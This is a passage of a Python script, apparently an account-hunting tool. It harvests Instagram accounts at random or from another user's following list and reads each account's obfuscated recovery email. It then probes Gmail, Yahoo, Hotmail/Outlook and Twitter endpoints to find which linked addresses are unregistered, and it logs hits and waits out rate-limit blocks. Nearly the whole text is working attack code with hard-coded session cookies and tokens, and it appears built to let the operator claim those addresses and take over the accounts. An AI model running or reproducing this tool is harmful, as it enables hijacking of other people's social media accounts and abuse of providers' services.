ymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvIRVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&birthYear=&signup='
      	p = {'validateField': 'userId',}
      	response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
      	if 'userId' in response:
      		return 'bad'
      	
      	
      	else:
      		
      		url = "https://api.twitter.com/i/users/email_available.json?email=" + email
      		headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
		'Host':'api.twitter.com',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',}
      		req = requests.get(url,headers=headers).json()
      		text = str(req)
      		if text.find("'valid': False") == True:
      			return 'done'	
      		else:
      			return 'email_good'
      		
      		
      			
      				
      		
      
      
      
      
      
      
      
      
     
      
      
      
      if domen == '@gmail.com':
          url = 'https://android.clients.google.com/setup/checkavail'
          headers = {
				'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
   }
          data = json.dumps({
	          'username': email,
	          'version': '3',
	          'firstName': '3mk',
	          'lastName': 'Coder' })
          res = requests.post(url, data=data, headers=headers).json()['status']
          if res == 'SUCCESS':
            url = "https://api.twitter.com/i/users/email_available.json?email=" + email
            headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
		'Host':'api.twitter.com',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',}
            req = requests.get(url,headers=headers).json()
            text = str(req)
            if text.find("'valid': False") == True:
              return 'done'	
            else:
              return 'email_good'
          else:
            return 'bad'
        
        
        
        
        
       
      
      
      
      
      
      
      
      elif domen == '@hotmail.com' or domen == '@outlook.com':
      	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
      	data = ''
      	headers = {
	"Accept": "*/*",
	"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Connection": "close",
    "Host": "odc.officeapps.live.com",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
    "uaid": "d06e1498e7ed4def9078bd46883f187b",
    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
      	html = requests.get(url, data=data, headers=headers).text
      	if 'Neither' in html:
           url = "https://api.twitter.com/i/users/email_available.json?email=" + email
           headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
		'Host':'api.twitter.com',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',}
           req = requests.get(url,headers=headers).json()
           text = str(req)
           if text.find("'valid': False") == True:
             return 'done'	
           else:
             return 'email_good'
      	else:
      		return 'bad'












print(f'''
{BRed}

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠀⠀⠀⠈⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠛⠿⣷⣤⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣶⣦⣤⣤⣀⣀⣀⡀⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⣿⣿⣿⠁⠀⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠀⠀
⠀⠀⢿⣿⣿⣆⠀⠀⠀⠀⠈⠛⠿⣿⣶⣦⡤⠴⠀⠀⠀⠀⠀⣸⣿⣿⣿⡿⠀⠀
⠀⠀⠈⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀

{White}
INSTAGRAM :{Yellow} FX_PY3  {White} TELEGRAM :{Yellow} FX_PY

{BWhite}
==============================

{BYellow}[{BWhite}1{BYellow}]{BWhite} - TIKTOK    {BYellow}[{BWhite}2{BYellow}]{BWhite} - INSTAGRAM
{BYellow}[{BWhite}3{BYellow}]{BWhite} - FACEBOOK  {BYellow}[{BWhite}4{BYellow}]{BWhite} - TWITTER{BWhite}

==============================

''')
choose=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Choose : '))
list='qwertyuiopasdfghjklzxcvbnm'
dome=0
if choose == 2:
	print(f'''
==============================

{BYellow}[{BWhite}1{BYellow}]{BWhite} - Random    {BYellow}[{BWhite}2{BYellow}]{BWhite} - From following

==============================

''')
	qus=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Choose : '))
	if qus == 1:
		print(f'''
	==============================
	
	{BYellow}[{BWhite}1{BYellow}]{BWhite} - GMAIM    {BYellow}[{BWhite}2{BYellow}]{BWhite} - YAHOO
	{BYellow}[{BWhite}3{BYellow}]{BWhite} - HOTMAIL  {BYellow}[{BWhite}4{BYellow}]{BWhite} - OUTLOOK{BWhite}
	
	==============================
	
		''')
		domen_num=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Choose : '))
		lingth=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Lingth the email : '))
		while True:
			email=str("".join(random.choice(list)for i in range(lingth)))
			
			if domen_num == 1:
				domen='@gmail.com'
			elif  domen_num == 2:
				domen='@yahoo.com'
			elif  domen_num == 3:
				domen='@hotmail.com'
			elif  domen_num == 4:
				domen='@outlook.com'
			EMAIL=email+domen
			
			o=INSTAGRAM(EMAIL,domen)
			sleep(3)
			print('\n\n')
			if o == 'block':
				print(Red+' YOUR BLOCKED')
				block+=1
				for i in range(1800):
						time = 1800-i
						sleep(1)
						print(f'\r {White} Seconds [{time}]',end='')
			if o == 'bad':
				bad+=1
				print(White+' - - - - - - - - - - - - - - - - ')
				print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
				print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Red}[x]')
				print(White+' - - - - - - - - - - - - - - - - ')
			if o == 'done':
				done+=1
				open('done_ig.txt','a+').write(str(EMAIL)+'\n')
				print(White+' - - - - - - - - - - - - - - - - ')
				print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
				print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Green}[✓]')
				print(EMAIL)
				print(White+' - - - - - - - - - - - - - - - - ')
				open('done.txt','a+').write(str(EMAIL)+'\n')
				sleep(3)
			if o == 'email_good':
				bad+=1
				print(White+' - - - - - - - - - - - - - - - - ')
				print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
				print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Green}[✓]')
				print(White+' - - - - - - - - - - - - - - - - ')
	elif qus == 2:
			username = input(f'{BWhite}[{BYellow}+{BWhite}] - Your Username : ')
			password = input(f'{BWhite}[{BYellow}+{BWhite}] - Your Password : ')
			url = 'https://www.instagram.com/accounts/login/ajax/'
			headers = {
			     'accept': '*/*',
			    'accept-encoding': 'gzip, deflate, br',
			    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
			    'content-length': '275',
			    'content-type': 'application/x-www-form-urlencoded',
			    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
			    'origin': 'https://www.instagram.com',
			    'referer': 'https://www.instagram.com/',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
			    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
			    'x-ig-app-id': '936619743392459',
			    'x-ig-www-claim': '0',
			    'x-instagram-ajax': 'bc3d5af829ea',
			    'x-requested-with': 'XMLHttpRequest'
			  }
			data = {
			         'username': f'{username}',
			         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
			         'queryParams': '{}',
			         'optIntoOneTap': 'false'
			    } 
			rs=requests.session()
			r = rs.post(url, headers=headers, data=data)
			
			
			if  'authenticated":true' in r.text or 'userId' in r.text:
				csrftoken=r.cookies['csrftoken']
				si=r.cookies['sessionid']
				id=r.cookies['ds_user_id']
				
				user = input(f'{BWhite}[{BYellow}+{BWhite}] - username the acc : ')
			else:
				print(f'{BWhite}[{BYellow}-{BWhite}] {Red}- bad login ')
				exit()
			
			
			
			
			
			
			url=f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
			headers={
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
  'cache-control': 'max-age=0',
  'cookie': f'ig_did=37396E22-2BAA-45B4-BE12-2C138F2EE907; ig_nrcb=1; mid=Yoo2NAALAAF_bSUg9E76T9FjnyOg; datr=1w6bYk9s5Fe7mNlwoBvLzX_d; shbid="6501\{id}\0541689888481:01f73c5c447b81316667f3fef03e854ec17819127a3a7cfc708b6d6e3b1375631101f397"; shbts="1658352481\{id}\0541689888481:01f71e2280fe2389aebca035d43296bda632ccf8386b2b0d3dbc3285dce2018e676c77fc"; ds_user_id={id}; csrftoken={csrftoken}; sessionid={si}; rur="NAO/{id}\0541690144166:01f716870c4d087f0dc86549dd21ad03c1b4a998a97bce93ceda73f7ddfef603bcf6b03a"',
  'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'none',
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 Instagram 231.0.0.18.113',
  'x-frame-options': 'SAMEORIGIN'
}
			req=requests.get(url,headers=headers)
			Id=str(req.json()['data']['user']['id'])
			
			k=0
			dome=0
			while True:
				sleep(3)
				url=f'https://i.instagram.com/api/v1/friendships/{Id}/following/?count=1000'
				headers={
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		    'accept-encoding': 'gzip, deflate, br',
		    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		    'cache-control': 'max-age=0',
		    'cookie': f'ig_did=37396E22-2BAA-45B4-BE12-2C138F2EE907; ig_nrcb=1; mid=Yoo2NAALAAF_bSUg9E76T9FjnyOg; datr=1w6bYk9s5Fe7mNlwoBvLzX_d; ds_user_id={id}; shbid="6501\{id}\0541690153954:01f73336d2f16eae237610a06f5bcd1f504113d2f3f5a8272e7a3632b1c49a2b38d996b8"; shbts="1658617954\{id}\0541690153954:01f7daef559297f48fade12c799d37d559c1714e6d5f1c748d113e3afe054482d99ce705"; csrftoken={csrftoken}; sessionid={si}; rur="NAO\{id}\0541690220317:01f7a8da6b0e6b43e92dfc93007569e40f9e2e1b878df993fcb2864254ddd65cdb5e7daf"',
		    'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Windows"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'none',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 Instagram 231.0.0.18.113',
		    'x-frame-options': 'SAMEORIGIN'
		    }
		    
				req=requests.get(url,headers=headers)
				r=req.json()['users']
				use=r[k]['username']
				
				
				k+=1
				url = "https://i.instagram.com:443/api/v1/users/lookup/"
				cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
				headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
             "Accept-Language": "ar-AE",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "User-Agent": "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",
             "Accept-Encoding": "gzip, deflate"}
				data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % use }
				r=requests.session()
				req = r.post(url, headers=headers,cookies=cookies, data=data)
				try:
					do=req.json()['obfuscated_email']
					Domen=do.split('*')[1]
					
					if '@gmail.com' in Domen:
						EMAIL=use+'@gmail.com'
						re = r.post(url, headers=headers,cookies=cookies, data=data)
						if re.json()['status']=='ok':
							url = 'https://android.clients.google.com/setup/checkavail'
							headers = {
					'Content-Length': '98',
	        'Content-Type': 'text/plain; charset=UTF-8',
	        'Host': 'android.clients.google.com',
	        'Connection': 'Keep-Alive',
	        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
	   }
							data = json.dumps({
		          'username': EMAIL,
		          'version': '3',
		          'firstName': '3mk',
		          'lastName': 'Coder' })
							res = requests.post(url, data=data, headers=headers).json()['status']
							if res == 'SUCCESS':
								done+=1
								print('\n\n')
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Green}[✓]')
								print(EMAIL)
								print(White+' - - - - - - - - - - - - - - - - ')
								print('\n\n')
								open('done_ig.txt','a+').write(str(EMAIL)+'\n')
							else:
								bad+=1
								print('\n\n')
								print(White+' - - - - - - - - - - - - - - - - ')
								print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
								print(f'\n {White}Instagram  {Green}[✓] {White}||{White} Email {Red}[x]')
								
								print(White+' - - - - - - - - - - - - - - - - ')
								print('\n\n')
							
						elif 'spam' in re.text:
							block+=1
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Red}[x]')
									
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')
							for i in range(1800):
								time = 1800-i
								sleep(1)
								print(f'\r {White} Seconds [{time}]',end='')
						elif  re.json()['status']=='fail': 
							bad+=1
							print('\n\n')
							print(White+' - - - - - - - - - - - - - - - - ')
							print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
							print(f'\n {White}Instagram  {Red}[x] {White}||{White} Email {Green}[✓]')
									
							print(White+' - - - - - - - - - - - - - - - - ')
							print('\n\n')
	
	
					if '@yahoo.com' in Domen:
						EMAIL=use+'@yahoo.com'
						re = r.post(url, headers=headers,cookies=cookies, data=data)
						if re.json()['status']=='ok':
							headers = {
							'authority': 'login.yahoo.com',
						  'accept': '*/*',
						  'accept-language': 'en-US,en;q=0.9',
						  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				      'origin': 'https://login.yahoo.com',
				      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
				      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
				      'sec-ch-ua-mobile': '?0',
				      'sec-ch-ua-platform': '"Windows"',
				      'sec-fetch-dest': 'empty',
				      'sec-fetch-mode': 'cors',
				      'sec-fetch-site': 'same-origin',
				      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
				      'x-requested-with': 'XMLHttpRequest',
				}
							cook = {
